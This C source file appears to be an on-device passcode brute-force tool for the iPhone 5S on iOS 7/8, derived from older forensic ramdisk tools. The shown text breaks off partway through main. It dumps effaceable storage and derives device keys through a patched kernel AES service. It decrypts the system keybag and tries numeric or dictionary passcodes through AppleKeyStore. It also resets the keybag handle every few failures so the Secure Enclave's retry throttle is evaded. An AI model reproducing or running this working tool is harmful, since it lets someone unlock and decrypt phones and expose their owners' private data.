// brute — on-device passcode brute-force for 64-bit A7 (iPhone 5S) iOS 7/8.
//
// Adapted for iPhone6,2 (S5L8960X, arm64), verified on iOS 7.1.2 and 8.3
// booted via a pwned-iBoot ramdisk (mnt2 mounted rw with `protect`).
//
// Source lineage: dinosec/iphone-dataprotection ramdisk_tools
//   (systemkb_bruteforce.c / AppleKeyStore.c / AppleKeyStore_kdf.c /
//   IOAESAccelerator.c / AppleEffaceableStorage.c, Sogeti R&D), reworked
//   for the arm64 IOAESAccelerator request layout and the A7 SEP keybag.
//
// Two verification paths:
//   default   userland tangle (pre-A7 "no-SEP" recompute; does NOT work on
//             A7 — keybag wrapping is done inside the SEP hierarchy)
//   -k        kernel AppleKeyStore user client, selectors identical to
//             non-SEP devices; the (alive) SEP executes underneath
//
// Usage: brute -n <digits> [options]         numeric 0000..10^n-1
//        brute -k <dict_file> [options]      dictionary (mixed passcodes)
//        brute -K <passcode> [keybag_path]   single candidate test
//        brute -D                            dump effaceable storage
// Options: -u userland verification, --disable-keybag-reset,
//          --keybag-reset-time N (default 5; reset is ON by default)

#include <CommonCrypto/CommonCryptor.h>
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>

#include "bsdcrypto/pbkdf2.h"
#include "bsdcrypto/rijndael.h"
#include "bsdcrypto/key_wrap.h"

// ---------------------------------------------------------------- constants

enum {
    kAESMethod       = 1,     // IOAESAccelerator user client selector
    kAESEncrypt      = 0,
    kAESDecrypt      = 1,
    kAESCustomMask   = 0,
    kAESUIDMask      = 0x7d0, // UID key (kernel patch lets this through)
    kAESUIDPlusMask  = 0x7d1, // UID+salt variant, keybag type & 0x40000000
    kEffaceableGetBytes = 1,
    kEffaceableGetLocker = 5,
    kLockerBAG1 = 0x42414731, // multichar 'BAG1' (locker tags stored reversed)
    kLockerLWVM = 0x4c77564d, // multichar 'LWVM'
};

// Fixed-width mirror of the kernel-side IOAESAccelerator request on arm64
// (kernel pointers are 8 bytes, so this layout must not be re-packed).
typedef struct {
    void     *cleartext;
    void     *ciphertext;
    uint32_t  size;
    uint8_t   iv[16];
    uint32_t  mode;
    uint32_t  bits;
    uint8_t   key[32];
    uint32_t  mask;
    uint32_t  uidplus_length;
    struct __attribute__((packed)) {
        uint32_t data_length;
        uint8_t  data[0x20];
        uint32_t one;
        uint32_t zero;
    } uidplus;
} AESRequest;

typedef struct __attribute__((packed)) {
    uint16_t magic;   // 0x4c6b
    uint16_t length;
    uint32_t tag;
    uint8_t  data[];
} Locker;

typedef struct {
    uint32_t magic;   // 'BAG1'
    uint8_t  iv[16];
    uint8_t  key[32];
} BAG1Locker;

#define MAX_CLASS_KEYS 20

typedef struct {
    uint8_t  uuid[16];
    uint32_t clas;
    uint32_t wrap;
    uint8_t  wpky[40];
} ClassKey;

typedef struct {
    uint32_t version;
    uint32_t type;
    uint8_t  uuid[16];
    uint8_t  hmck[40];
    uint8_t  salt[20];
    uint32_t iter;
    uint32_t numKeys;
    ClassKey keys[MAX_CLASS_KEYS];
} KeyBag;

// keybag TLV tags, big-endian read of the on-disk forward bytes ("VERS"...)
#define TAG_VERS 0x56455253u
#define TAG_TYPE 0x54595045u
#define TAG_SALT 0x53414C54u
#define TAG_ITER 0x49544552u
#define TAG_UUID 0x55554944u
#define TAG_CLAS 0x434C4153u
#define TAG_WRAP 0x57524150u
#define TAG_WPKY 0x57504B59u

// ---------------------------------------------------------------- globals

static io_connect_t g_aes_conn = MACH_PORT_NULL;
static io_connect_t g_eff_conn = MACH_PORT_NULL;

static size_t g_size_base = 0;   // accepted request size without uidplus
static size_t g_size_full = 0;   // accepted request size with uidplus

static const uint8_t seed835[16] = {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1};
static const uint8_t seed89B[16] = {
    0x18,0x3e,0x99,0x67,0x6b,0xb0,0x3c,0x54,
    0x6f,0xa4,0x68,0xf5,0x1c,0x0c,0xbd,0x49,
};

#define TANGLE_BUFSZ 4096
static uint8_t tangle_in[TANGLE_BUFSZ]  __attribute__((aligned(64)));
static uint8_t tangle_out[TANGLE_BUFSZ] __attribute__((aligned(64)));

// ---------------------------------------------------------------- helpers

static void hex(const char *label, const uint8_t *p, size_t n) {
    printf("%s=", label);
    for (size_t i = 0; i < n; i++) printf("%02x", p[i]);
    putchar('\n');
}

// Dump raw effaceable bytes for offline analysis (brute -D).
static io_connect_t open_service(const char *name);
static int uid_encrypt(const uint8_t seed[16], uint8_t out[16]);
static kern_return_t effaceable_bytes(uint8_t *buf, size_t *len);
static int dump_mode(void) {
    g_aes_conn = open_service("IOAESAccelerator");
    g_eff_conn = open_service("AppleEffaceableStorage");
    if (!g_aes_conn || !g_eff_conn) return 2;

    uint8_t key835[16], key89b[16];
    if (uid_encrypt(seed835, key835) || uid_encrypt(seed89B, key89b)) return 3;
    hex("[D] key835", key835, 16);
    hex("[D] key89B", key89b, 16);

    uint8_t buf[960];
    size_t len = sizeof(buf);
    uint64_t inScalar = kLockerBAG1;
    uint64_t outScalar = 0;
    uint32_t outCnt = 1;
    memset(buf, 0, sizeof(buf));
    kern_return_t kr = IOConnectCallMethod(g_eff_conn, kEffaceableGetLocker,
                                           &inScalar, 1, NULL, 0,
                                           &outScalar, &outCnt, buf, &len);
    printf("[D] getLocker rc=0x%08x len=%zu\n", kr, len);
    hex("[D] getLocker", buf, len);

    len = sizeof(buf);
    memset(buf, 0, sizeof(buf));
    kr = effaceable_bytes(buf, &len);
    printf("[D] getBytes rc=0x%08x len=%zu\n", kr, len);
    hex("[D] raw960", buf, len);
    return 0;
}

static double now_ms(void) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (double)tv.tv_sec * 1000.0 + (double)tv.tv_usec / 1000.0;
}

static uint32_t rd_be32(const uint8_t *p) {
    return (uint32_t)p[0] << 24 | (uint32_t)p[1] << 16 |
           (uint32_t)p[2] << 8 | (uint32_t)p[3];
}

static io_connect_t open_service(const char *name) {
    CFMutableDictionaryRef matching = IOServiceMatching(name);
    io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, matching);
    if (!service) {
        fprintf(stderr, "[-] service missing: %s\n", name);
        return MACH_PORT_NULL;
    }
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] IOServiceOpen(%s) = 0x%08x\n", name, kr);
        return MACH_PORT_NULL;
    }
    return conn;
}

// One IOAESAccelerator call with separate in/out structs (the kernel writes a
// response that clobbers non-echoed fields like mask/key, so the request must
// not double as the response buffer). Probes the accepted request size once
// per variant (plain / uidplus), mirroring the verified aes89b_diag.c.
static kern_return_t aes_call(AESRequest *in, AESRequest *out, int use_uidplus) {
    size_t base = offsetof(AESRequest, uidplus);
    size_t full = sizeof(AESRequest);
    size_t candidates[4];
    size_t ncand = 0;

    if (use_uidplus) {
        if (g_size_full) candidates[ncand++] = g_size_full;
        candidates[ncand++] = full;
        candidates[ncand++] = full - sizeof(uint32_t);
    } else {
        if (g_size_base) candidates[ncand++] = g_size_base;
        candidates[ncand++] = base;
        candidates[ncand++] = (base + 7) & ~(size_t)7;
    }

    kern_return_t kr = 0xe00002c2; // kIOReturnBadArgument
    for (size_t i = 0; i < ncand; i++) {
        size_t out_size = candidates[i];
        kr = IOConnectCallStructMethod(g_aes_conn, kAESMethod,
                                       in, candidates[i],
                                       out, &out_size);
        if (kr == KERN_SUCCESS) {
            if (use_uidplus) g_size_full = candidates[i];
            else             g_size_base = candidates[i];
            return kr;
        }
        if (kr != 0xe00002c2)
            return kr;
    }
    return kr;
}

// Raw single-shot AES with explicit key/mask/mode. IV zeroed unless chained
// by the caller through a reused request.
static kern_return_t aes_run(const void *in, void *out, uint32_t len,
                             uint32_t mask, const void *key16,
                             uint32_t mode, int use_uidplus) {
    AESRequest req;
    AESRequest resp;
    memset(&req, 0, sizeof(req));
    memset(&resp, 0, sizeof(resp));
    req.cleartext = (void *)in;
    req.ciphertext = out;
    req.size = len;
    req.mode = mode;
    req.bits = 128;
    req.mask = mask;
    if (key16) memcpy(req.key, key16, 16);
    if (use_uidplus) {
        req.uidplus_length = sizeof(req.uidplus);
        req.uidplus.one = 1;
        req.uidplus.zero = 0;
        req.uidplus.data_length = 20;
    }
    return aes_call(&req, &resp, use_uidplus);
}

static int uid_encrypt(const uint8_t seed[16], uint8_t out[16]) {
    uint8_t buf[16] __attribute__((aligned(64)));
    memcpy(buf, seed, 16);
    kern_return_t kr = aes_run(buf, buf, 16, kAESUIDMask, NULL, kAESEncrypt, 0);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] UID AES (mask 0x%x) failed: 0x%08x\n", kAESUIDMask, kr);
        return -1;
    }
    memcpy(out, buf, 16);
    return 0;
}

// ---------------------------------------------------------- effaceable

static kern_return_t effaceable_bytes(uint8_t *buf, size_t *len) {
    uint64_t offset = 0;
    return IOConnectCallMethod(g_eff_conn, kEffaceableGetBytes,
                               &offset, 1, NULL, 0,
                               NULL, NULL, buf, len);
}

static const Locker *find_locker(const uint8_t *lockers, size_t len, uint32_t tag) {
    size_t pos = 0;
    while (pos + sizeof(Locker) <= len) {
        const Locker *item = (const Locker *)(lockers + pos);
        if (item->magic != 0x4c6b || item->length == 0 ||
            pos + sizeof(Locker) + item->length > len)
            break;
        printf("[.] locker tag=0x%08x len=%u off=%zu\n",
               item->tag, item->length, pos);
        if ((item->tag & ~0x80000000u) == tag)
            return item;
        pos += sizeof(Locker) + item->length;
    }
    return NULL;
}

// Validate a candidate (key,iv) by decrypting the first _MKBPAYLOAD block:
// the inner plist must start with "bplist00".
static int bag1_candidate_ok(const uint8_t key[32], const uint8_t iv[16],
                             const uint8_t *payload) {
    uint8_t block[32];
    size_t moved = 0;
    CCCryptorStatus cs = CCCrypt(kCCDecrypt, kCCAlgorithmAES128, 0,
                                 key, kCCKeySizeAES256, iv,
                                 payload, sizeof(block), block, sizeof(block),
                                 &moved);
    printf("[.] cand cs=%d moved=%zu block=%02x%02x%02x%02x\n", cs, moved,
           block[0], block[1], block[2], block[3]);
    return cs == kCCSuccess && moved >= 8 && memcmp(block, "bplist00", 8) == 0;
}

// Generate BAG1 key/iv candidates from a 52-byte locker payload and return
// the first one that decrypts _MKBPAYLOAD to a bplist. Variants: the payload
// is AES-CBC encrypted (48-byte block-aligned windows) with key89B or key835,
// or plaintext; iv/key order per struct BAG1Locker is iv-then-key.
static int recover_bag1(const uint8_t *payload52, size_t payload_len,
                        const uint8_t key89b[16], const uint8_t key835[16],
                        const uint8_t *mkbpayload, BAG1Locker *out) {
    struct { size_t off, len; int keyidx; const char *name; } variants[] = {
        {0, 48, 0, "dec[0:48] key89B"},   {0, 48, 1, "dec[0:48] key835"},
        {4, 48, 0, "dec[4:52] key89B"},   {4, 48, 1, "dec[4:52] key835"},
        {4, 52, 2, "raw"},
    };
    const uint8_t *keys[3] = {key89b, key835, NULL};

    for (size_t v = 0; v < sizeof(variants) / sizeof(variants[0]); v++) {
        if (payload_len < variants[v].off + 16) continue;
        size_t take = variants[v].len;
        if (take > payload_len - variants[v].off) take = payload_len - variants[v].off;
        take &= ~(size_t)15; // AES-CBC whole blocks only

        uint8_t dec[52] __attribute__((aligned(64)));
        memset(dec, 0, sizeof(dec));
        if (keys[variants[v].keyidx]) {
            uint8_t enc[52] __attribute__((aligned(64)));
            memset(enc, 0, sizeof(enc));
            memcpy(enc, payload52 + variants[v].off, take);
            kern_return_t r = aes_run(enc, dec, (uint32_t)take, kAESCustomMask,
                                      keys[variants[v].keyidx], kAESDecrypt, 0);
            if (r != KERN_SUCCESS) {
                printf("[!] BAG1 variant %s AES failed: 0x%08x\n", variants[v].name, r);
                continue;
            }
        } else {
            memcpy(dec, payload52 + variants[v].off,
                   payload_len - variants[v].off < 52 ? payload_len - variants[v].off : 52);
        }

        BAG1Locker cand;
        memset(&cand, 0, sizeof(cand));
        if (take >= 48) { // iv then key (struct order)
            memcpy(cand.iv, dec, 16);
            memcpy(cand.key, dec + 16, 32);
            if (bag1_candidate_ok(cand.key, cand.iv, mkbpayload)) {
                *out = cand;
                printf("[+] BAG1 recovered: %s (iv,key order)\n", variants[v].name);
                return 0;
            }
            memcpy(cand.key, dec, 32);      // key then iv
            memcpy(cand.iv, dec + 32, 16);
            if (bag1_candidate_ok(cand.key, cand.iv, mkbpayload)) {
                *out = cand;
                printf("[+] BAG1 recovered: %s (key,iv order)\n", variants[v].name);
                return 0;
            }
        }
        printf("[!] BAG1 variant %s did not yield a plist\n", variants[v].name);
    }
    return -1;
}

// Obtain the BAG1 key/iv. Tries the kernel getLocker payload first, then the
// raw 960-byte effaceable region; candidates are validated against
// _MKBPAYLOAD itself (must decrypt to a bplist).
static int get_bag1(const uint8_t key89b[16], const uint8_t key835[16],
                    const uint8_t *mkbpayload, size_t mkbpayload_len,
                    BAG1Locker *out) {
    if (mkbpayload_len < 32) return -1;

    // 1) kernel-side getLocker: returns the 52-byte locker payload
    uint8_t buf[960];
    size_t len = sizeof(buf);
    uint64_t inScalar = kLockerBAG1;
    uint64_t outScalar = 0;
    uint32_t outCnt = 1;
    memset(buf, 0, sizeof(buf));
    kern_return_t kr = IOConnectCallMethod(g_eff_conn, kEffaceableGetLocker,
                                           &inScalar, 1, NULL, 0,
                                           &outScalar, &outCnt,
                                           buf, &len);
    if (kr == KERN_SUCCESS && len >= 48) {
        printf("[.] kernel getLocker returned %zu bytes\n", len);
        if (!recover_bag1(buf, len, key89b, key835, mkbpayload, out))
            return 0;
    } else {
        printf("[!] kernel getLocker rc=0x%08x len=%zu\n", kr, len);
    }

    // 2) raw effaceable bytes (960-byte fixed region)
    len = sizeof(buf);
    memset(buf, 0, sizeof(buf));
    kr = effaceable_bytes(buf, &len);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] effaceable getBytes failed: 0x%08x\n", kr);
        return -1;
    }
    printf("[+] effaceable raw bytes: %zu\n", len);
    const Locker *bag1 = find_locker(buf, len, kLockerBAG1);
    if (!bag1 || bag1->length < 48) {
        fprintf(stderr, "[-] BAG1 locker not found in effaceable storage\n");
        return -1;
    }
    return recover_bag1(bag1->data, bag1->length, key89b, key835, mkbpayload, out);
}

// ---------------------------------------------------------- keybag

static CFPropertyListRef read_plist_file(const char *path) {
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        kCFAllocatorDefault, (const UInt8 *)path, strlen(path), 0);
    if (!url) return NULL;
    CFReadStreamRef stream = CFReadStreamCreateWithFile(kCFAllocatorDefault, url);
    CFRelease(url);
    if (!stream) return NULL;
    if (CFReadStreamOpen(stream) != TRUE) {
        CFRelease(stream);
        return NULL;
    }
    CFPropertyListRef plist = CFPropertyListCreateWithStream(
        kCFAllocatorDefault, stream, 0, kCFPropertyListImmutable, NULL, NULL);
    CFReadStreamClose(stream);
    CFRelease(stream);
    return plist;
}

// Read the outer systembag.kb plist and return _MKBPAYLOAD bytes (copied).
static uint8_t *read_mkbpayload(const char *path, size_t *out_len) {
    CFDictionaryRef outer = read_plist_file(path);
    if (!outer || CFGetTypeID(outer) != CFDictionaryGetTypeID()) {
        fprintf(stderr, "[-] cannot read keybag plist %s\n", path);
        return NULL;
    }
    CFDataRef payload = CFDictionaryGetValue(outer, CFSTR("_MKBPAYLOAD"));
    if (!payload || CFDataGetLength(payload) < 16) {
        fprintf(stderr, "[-] _MKBPAYLOAD missing\n");
        CFRelease(outer);
        return NULL;
    }
    CFIndex length = CFDataGetLength(payload);
    uint8_t *buf = valloc(length);
    CFDataGetBytes(payload, CFRangeMake(0, length), buf);
    CFRelease(outer);
    *out_len = length;
    return buf;
}

// Decrypt _MKBPAYLOAD with the BAG1 key/iv and parse the inner plist.
static CFDictionaryRef load_keybag_dict(const uint8_t *buf, size_t length,
                                        const BAG1Locker *bag1) {
    size_t decrypted = 0;
    CCCryptorStatus cs = CCCrypt(kCCDecrypt, kCCAlgorithmAES128,
                                 kCCOptionPKCS7Padding,
                                 bag1->key, kCCKeySizeAES256, bag1->iv,
                                 buf, length, buf, length, &decrypted);
    if (cs != kCCSuccess) {
        fprintf(stderr, "[-] _MKBPAYLOAD decrypt failed: %x\n", cs);
        return NULL;
    }
    CFDataRef inner_data = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault,
                                                       buf, decrypted,
                                                       kCFAllocatorNull);
    CFPropertyListRef inner = CFPropertyListCreateWithData(
        kCFAllocatorDefault, inner_data, kCFPropertyListImmutable, NULL, NULL);
    CFRelease(inner_data);
    if (!inner || CFGetTypeID(inner) != CFDictionaryGetTypeID()) {
        fprintf(stderr, "[-] inner keybag plist parse failed\n");
        if (inner) CFRelease(inner);
        return NULL;
    }
    return inner;
}

static KeyBag *parse_binary_keybag(CFDataRef kbdata) {
    const uint8_t *ptr = CFDataGetBytePtr(kbdata);
    size_t total = CFDataGetLength(kbdata);
    if (total < 8 || memcmp(ptr, "DATA", 4) != 0) {
        fprintf(stderr, "[-] keybag blob does not start with DATA\n");
        return NULL;
    }
    uint32_t dlen = rd_be32(ptr + 4);
    if ((size_t)8 + dlen > total) {
        fprintf(stderr, "[-] keybag DATA length out of range\n");
        return NULL;
    }
    const uint8_t *end = ptr + 8 + dlen;

    KeyBag *kb = malloc(sizeof(KeyBag));
    memset(kb, 0, sizeof(KeyBag));

    const uint8_t *p = ptr + 8;
    int i = -1, have_uuid = 0;
    while (p + 8 <= end) {
        uint32_t tag = rd_be32(p);
        uint32_t len = rd_be32(p + 4);
        if ((size_t)(p + 8 + len - ptr) > (size_t)(end - ptr)) break;
        const uint8_t *d = p + 8;
        switch (tag) {
        case TAG_VERS: kb->version = rd_be32(d); break;
        case TAG_TYPE: kb->type = rd_be32(d); break;
        case TAG_SALT: memcpy(kb->salt, d, len < 20 ? len : 20); break;
        case TAG_ITER: kb->iter = rd_be32(d); break;
        case TAG_UUID:
            if (!have_uuid) {
                memcpy(kb->uuid, d, 16);
                have_uuid = 1;
            } else {
                if (++i >= MAX_CLASS_KEYS) goto done;
                memcpy(kb->keys[i].uuid, d, 16);
            }
            break;
        case TAG_CLAS: if (i >= 0) kb->keys[i].clas = rd_be32(d); break;
        case TAG_WRAP: if (i >= 0) kb->keys[i].wrap = rd_be32(d); break;
        case TAG_WPKY: if (i >= 0) memcpy(kb->keys[i].wpky, d, len < 40 ? len : 40); break;
        default: {
            char t[5] = {p[0], p[1], p[2], p[3], 0};
            printf("[.] keybag tag %s len=%u (ignored)\n", t, len);
            break;
        }
        }
        p += 8 + len;
    }
done:
    kb->numKeys = i + 1;
    return kb;
}

// ---------------------------------------------------------- passcode KDF

static uint32_t xor_expand(uint32_t *dst, size_t dst_len_u32,
                           const uint32_t *input, size_t in_len_u32,
                           uint32_t xor_key) {
    size_t di = 0;
    while (di < dst_len_u32) {
        for (size_t j = 0; j < in_len_u32; j++) {
            dst[di++] = input[j] ^ xor_key;
            if (di >= dst_len_u32) break;
        }
        xor_key++;
    }
    return xor_key;
}

static void xor_compress(const uint32_t *input, size_t input_len_u32,
                         uint32_t *output, size_t output_len_u32) {
    for (size_t i = 0; i < input_len_u32; i++)
        output[i % output_len_u32] ^= input[i];
}

// The "tangle": iter iterations of xor-expand -> whole-buffer UID-AES ->
// xor-compress, IV chained by the kernel across iterations. Mirrors
// AppleKeyStore_derivation() semantics incl. version>=2 and UIDPlus.
static int derive_passcode_key(const KeyBag *kb, uint8_t passcode_key[32],
                               const char *passcode, size_t passcode_len) {
    pkcs5_pbkdf2(passcode, passcode_len, (const char *)kb->salt, 20,
                 passcode_key, 32, 1);

    uint32_t data_len = 32;
    uint32_t nblocks = TANGLE_BUFSZ / data_len; // 128
    uint32_t iter = kb->iter;
    uint32_t xorkey = 1;
    uint8_t input_copy[32] __attribute__((aligned(64)));
    const uint8_t *input = passcode_key;
    if (kb->version >= 2) {
        memcpy(input_copy, passcode_key, 32);
        input = input_copy;
    }

    int use_uidplus = (kb->type & 0x40000000) != 0;

    AESRequest req;
    AESRequest resp;
    memset(&req, 0, sizeof(req));
    memset(&resp, 0, sizeof(resp));
    req.cleartext = tangle_in;
    req.ciphertext = tangle_out;
    req.size = TANGLE_BUFSZ;
    req.mode = use_uidplus ? 2 : kAESEncrypt;
    req.bits = 128;
    req.mask = use_uidplus ? kAESUIDPlusMask : kAESUIDMask;
    if (use_uidplus) {
        req.uidplus_length = sizeof(req.uidplus);
        req.uidplus.one = 1;
        req.uidplus.zero = 0;
        req.uidplus.data_length = 20;
        memcpy(req.uidplus.data, kb->salt, 20);
        printf("[.] tangle: UIDPlus path (type=0x%08x)\n", kb->type);
    }

    while (iter > 0) {
        uint32_t next = xor_expand((uint32_t *)tangle_in,
                                   TANGLE_BUFSZ / 4,
                                   (const uint32_t *)input,
                                   data_len / 4, xorkey);
        if (kb->version >= 2)
            xorkey = next;

        kern_return_t kr = aes_call(&req, &resp, use_uidplus);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "[-] tangle AES failed: 0x%08x (mask=0x%x)\n",
                    kr, req.mask);
            return -1;
        }
        memcpy(req.iv, resp.iv, 16); // chain IV like AppleKeyStore_derivation

        uint32_t chunk = nblocks < iter ? nblocks : iter;
        xor_compress((const uint32_t *)tangle_out, chunk * data_len / 4,
                     (uint32_t *)passcode_key, data_len / 4);
        iter -= chunk;
    }
    return 0;
}

// Verdict: every passcode-wrapped (wrap&2) class key must RFC3394-unwrap
// cleanly. Works on a scratch copy; the master keybag stays pristine.
static int verify_passcode(KeyBag *scratch, const uint8_t passcode_key[32]) {
    aes_key_wrap_ctx ctx;
    uint8_t unwrapped[40];
    aes_key_wrap_set_key(&ctx, passcode_key, 32);
    for (uint32_t i = 0; i < scratch->numKeys; i++) {
        ClassKey *k = &scratch->keys[i];
        if (k->wrap & 2) {
            if (aes_key_unwrap(&ctx, k->wpky, unwrapped, 4) != 0)
                return 0; // integrity check failed => wrong passcode
            memcpy(k->wpky, unwrapped, 32);
            k->wrap &= ~2;
        }
    }
    return 1;
}

// ---------------------------------------------------------- candidate source

// Produces the next candidate passcode: either all N-digit numbers
// (0000..10^N-1, zero-padded) or lines of a dictionary file.
typedef struct {
    int digits;          // >0: numeric generator mode
    uint64_t next, total;
    FILE *dict;          // dictionary mode
    char buf[256];
} CandSrc;

static int cand_next(CandSrc *c, char *out, size_t outsz) {
    if (c->digits > 0) {
        if (c->next >= c->total) return 0;
        snprintf(out, outsz, "%0*llu", c->digits, (unsigned long long)c->next++);
        return 1;
    }
    while (fgets(c->buf, sizeof(c->buf), c->dict)) {
        size_t n = strlen(c->buf);
        while (n && (c->buf[n-1] == '\n' || c->buf[n-1] == '\r')) c->buf[--n] = 0;
        if (!n) continue;
        strlcpy(out, c->buf, outsz);
        return 1;
    }
    return 0;
}

// ---------------------------------------------------------- kext/SEP path

// "Like a non-SEP device" invocation: the AppleKeyStore user client selectors
// are identical to pre-A7 devices; on A7 the SEP executes underneath.
//   0 init, 5 KeyBagSetSystem, 6 KeyBagCreateWithData, 9 UnlockDevice
static io_connect_t g_ks_conn = MACH_PORT_NULL;

static kern_return_t ks_init(void) {
    uint64_t out = 0;
    uint32_t one = 1;
    return IOConnectCallMethod(g_ks_conn, 0, NULL, 0, NULL, 0,
                               &out, &one, NULL, NULL);
}

static kern_return_t ks_keybag_create(const uint8_t *blob, size_t len,
                                      uint64_t *id) {
    uint32_t cnt = 1;
    return IOConnectCallMethod(g_ks_conn, 6, NULL, 0,
                               blob, len, id, &cnt, NULL, NULL);
}

static kern_return_t ks_keybag_set_system(uint64_t id) {
    return IOConnectCallMethod(g_ks_conn, 5, &id, 1, NULL, 0,
                               NULL, NULL, NULL, NULL);
}

static kern_return_t ks_keybag_release(uint64_t id) {
    return IOConnectCallMethod(g_ks_conn, 4, &id, 1, NULL, 0,
                               NULL, NULL, NULL, NULL);
}

// Open a fresh AppleKeyStore user client and load the keybag into it.
// Recreating the handle + connection resets the SEP's consecutive-failure
// throttle state (observed: 6 fast attempts after every fresh setup).
static int ks_setup(CFDataRef kbdata, uint64_t *id) {
    g_ks_conn = open_service("AppleKeyStore");
    if (!g_ks_conn) return -1;
    kern_return_t kr = ks_init();
    if (kr != KERN_SUCCESS) return kr;
    kr = ks_keybag_create(CFDataGetBytePtr(kbdata), CFDataGetLength(kbdata), id);
    if (kr != KERN_SUCCESS) return kr;
    return ks_keybag_set_system(*id);
}

static kern_return_t ks_unlock(const char *passcode, size_t len) {
    return IOConnectCallMethod(g_ks_conn, 9, NULL, 0,
                               passcode, len, NULL, NULL, NULL, NULL);
}

// Run every candidate through the kernel AppleKeyStore. reset_every > 0
// (default) rebuilds the keybag handle + user client connection every N
// consecutive failures to dodge the SEP's ~5s-per-attempt throttle.
// Returns the winning passcode via found_passcode, 0 on success.
static int kext_brute(CandSrc *cand, CFDataRef kbdata, int reset_every,
                      char *found_passcode, size_t found_sz) {
    uint64_t keybag_id = 0;
    kern_return_t kr = ks_setup(kbdata, &keybag_id);
    printf("[.] kext setup rc=0x%08x id=0x%llx (reset_every=%d)\n", kr,
           (unsigned long long)keybag_id, reset_every);
    if (kr != KERN_SUCCESS) return kr;

    if (cand->digits > 0) {
        printf("[i] numeric mode: %llu candidates (%d digits)\n",
               (unsigned long long)cand->total, cand->digits);
    }

    char line[256];
    int index = 0, fails = 0, resets = 0;
    double t_all = now_ms();
    while (cand_next(cand, line, sizeof(line))) {
        index++;
        double t0 = now_ms();
        kr = ks_unlock(line, strlen(line));
        printf("[%d] \"%s\" -> rc=0x%08x %s (%.1f ms)\n", index, line, kr,
               kr == KERN_SUCCESS ? "*** FOUND ***" : "", now_ms() - t0);
        if (kr == KERN_SUCCESS) {
            strlcpy(found_passcode, line, found_sz);
            printf("[i] %d candidates, %d handle resets in %.1f ms "
                   "(%.1f ms each avg)\n", index, resets, now_ms() - t_all,
                   (now_ms() - t_all) / index);
            return 0;
        }
        fails++;
        if (reset_every > 0 && fails >= reset_every) {
            // tear down and rebuild silently: release handle, close client
            ks_keybag_release(keybag_id);
            IOServiceClose(g_ks_conn);
            g_ks_conn = MACH_PORT_NULL;
            keybag_id = 0;
            kr = ks_setup(kbdata, &keybag_id);
            resets++;
            if (kr != KERN_SUCCESS) {
                fprintf(stderr, "[-] kext re-setup failed: 0x%08x\n", kr);
                return kr;
            }
            fails = 0;
        }
    }
    printf("[i] %d candidates, %d handle resets in %.1f ms\n", index, resets,
           now_ms() - t_all);
    return 1;
}

// ---------------------------------------------------------- main

int main(int argc, char **argv) {
    if (argc >= 2 && strcmp(argv[1], "-D") == 0)
        return dump_mode();

    int digits = 0;            // -n N: numeric mode
    const char *dict_path = NULL; // -k FILE: dictionary mode (mixed passcodes)
    int userland = 0;          // -u: userland tangle verification (pre-A7)
    const char *single = NULL; // -K PASS: single candidate test
    int reset_every = 5;       // keybag handle reset ON by default
    const char *kb_path = "/mnt2/keybags/systembag.kb";
    int kb_set = 0;

    for (int argi = 1; argi < argc; argi++) {
        const char *a = argv[argi];
        if (strcmp(a, "-D") == 0) {
            return dump_mode();
        } else if (strcmp(a, "-n") == 0 && argi + 1 < argc) {
            digits = atoi(argv[++argi]);
            if (digits < 1 || digits > 10) {
                fprintf(stderr, "[-] -n expects 1..10 digits\n");
                return 2;
            }
        } else if (strcmp(a, "-k") == 0 && argi + 1 < argc) {
            dict_path = argv[++argi];
        } else if (strcmp(a, "-u") == 0) {
            userland = 1;
        } else if (strcmp(a, "-K") == 0 && argi + 1 < argc) {
            single = argv[++argi];
        } else if (strcmp(a, "--disable-keybag-reset") == 0) {
            reset_every = 0;
        } else if (strcmp(a, "--keybag-reset-time") == 0 && argi + 1 < argc) {
            reset_every = atoi(argv[++argi]);
        } else if (strcmp(a, "-r") == 0 && argi + 1 < argc) {
            reset_every = atoi(argv[++argi]); // alias
        } else if (a[0] != '-' && !kb_set) {
            kb_path = a;
            kb_set = 1;
        } else {
            fprintf(stderr,
                "usage: %s -n <digits> [options]        # numeric 0000..10^n-1\n"
                "       %s -k <dict_file> [options]     # dictionary (mixed passcodes)\n"
                "       %s -K <passcode> [keybag_path]  # single candidate test\n"
                "       %s -D                            # dump effaceable bytes\n"
                "options:\n"
                "  -u                        userland tangle verification (pre-A7 research path)\n"
                "  --disable-keybag-reset    turn OFF the throttle dodge (default: on, every 5 fails)\n"
                "  --keybag-reset-time N     rebuild keybag handle every N failures (default 5)\n"
                "  keybag_path               positional, default /mnt2/keybags/systembag.kb\n"
                "verification defaults to the kernel AppleKeyStore (SEP-backed);\n"
                "a hit prints *** FOUND *** and exits 0.\n",
                argv[0], argv[0], argv[0], argv[0]);
            return 2;
        }
    }

    if (!digits && !dict_path && !single) {
        fprintf(stderr, "[-] nothing to do: give -n <digits>, -k <dict_file> or -K <passcode>\n");
        return 2;
    }

    setvbuf(stdout, NULL, _IOLBF, 0);

    g_aes_conn = open_service("IOAESAccelerator");
    g_eff_conn = open_service("AppleEffaceableStorage");
    if (!g_aes_conn || !g_eff_conn) return 2;
    printf("[+] IOKit services open\n");

    uint8_t key835[16] = {0}, key89b[16] = {0};
    if (uid_encrypt(seed835, key835) || uid_encrypt(seed89B, key89b)) {
        // Not fatal: kext mode + the plaintext BAG1 locker work without the
        // UID AES patch; only the userland tangle needs these device keys.
        fprintf(stderr,
                "[!] UID AES (handle 0x7d0) unavailable — kernel not patched? "
                "Continuing with zero device keys (kext mode still works)\n");
        memset(key835, 0, 16);
        memset(key89b, 0, 16);
    }
    hex("[+] key835", key835, 16);
    hex("[+] key89B", key89b, 16);

    size_t payload_len = 0;
    uint8_t *payload = read_mkbpayload(kb_path, &payload_len);
    if (!payload) return 4;
